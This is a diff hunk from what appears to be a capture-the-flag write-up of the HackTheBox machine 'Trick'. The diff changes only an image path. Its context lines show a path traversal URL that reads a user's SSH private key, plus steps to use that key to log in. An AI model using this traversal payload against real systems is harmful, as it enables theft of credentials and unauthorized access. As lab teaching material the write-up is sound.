@@ -232,7 +232,7 @@ Grabbing Michael's SSH Private Key:
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (3).png" alt=""><figcaption></figcaption></figure>
 
 * After putting the private key in an id\_rsa file, we need to `chmod 600` this file and authenticate to the server via SSH
 
